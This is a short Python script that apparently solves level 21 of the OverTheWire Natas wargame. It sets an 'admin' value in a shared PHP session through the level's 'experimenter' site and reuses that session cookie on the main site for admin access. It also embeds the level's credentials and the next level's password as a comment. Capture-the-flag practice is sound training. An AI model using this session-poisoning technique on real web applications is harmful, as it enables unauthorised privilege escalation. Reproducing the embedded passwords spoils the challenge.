import requests
from string import *

user='natas21'
password='IFekPyrQXftziDEsUr3x21sYuahypdgJ'
url='http://%s.natas.labs.overthewire.org/'%user
exper='http://natas21-experimenter.natas.labs.overthewire.org/?debug=true'

session=requests.Session()

response=session.post(exper,data={'submit' :'1','admin' :'1'},auth=(user,password))
cook=response.cookies['PHPSESSID']
print "="*80

response=session.get(url,cookies={'PHPSESSID' : cook},auth=(user,password))
print response.text
print "="*80

#chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
